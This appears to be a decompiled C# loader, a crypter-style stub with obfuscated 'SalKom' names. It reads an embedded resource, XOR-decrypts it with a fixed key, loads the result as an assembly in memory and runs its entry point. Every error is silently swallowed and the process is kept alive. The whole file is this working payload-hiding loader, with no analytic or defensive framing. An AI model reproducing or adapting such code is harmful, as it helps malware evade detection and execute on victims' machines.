using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class SalKom
{
	public static byte[] SalKomBytes => Encoding.Default.GetBytes(SalKomX(Encoding.Default.GetString(SalKom4("_res32.resources")), 239));

	public static object SalKomNothing => null;

	[STAThread]
	public static void Main()
	{
		try
		{
			Thread thread = new Thread(SalKomNE);
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			SalKomRB(SalKomBytes);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void SalKomRB(byte[] SalKomD)
	{
		try
		{
			Thread thread = new Thread(SalKomO);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(SalKomD);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void SalKomO(object SalKomObj)
	{
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])SalKomObj).EntryPoint;
			entryPoint.Invoke(null, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void SalKomNE()
	{
	}

	public static void SalKomNM()
	{
		try
		{
			Assembly.Load(SalKomBytes).EntryPoint!.Invoke(null, null);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string SalKomX(string SalKomTTE, int SalKomK)
	{
		checked
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder(SalKomTTE);
				StringBuilder stringBuilder2 = new StringBuilder(SalKomTTE.Length);
				int num = SalKomTTE.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					char c = stringBuilder[i];
					c = Strings.Chr(Strings.Asc(c) ^ SalKomK);
					stringBuilder2.Append(c);
				}
				return stringBuilder2.ToString();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static byte[] SalKom4(string SalKom5)
	{
		checked
		{
			try
			{
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(SalKom5);
				byte[] buffer = new byte[(int)(manifestResourceStream.Length - 1L) + 1];
				int count = manifestResourceStream.Read(buffer, 0, (int)manifestResourceStream.Length);
				MemoryStream memoryStream = new MemoryStream(buffer, 0, count);
				return memoryStream.ToArray();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				byte[] result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
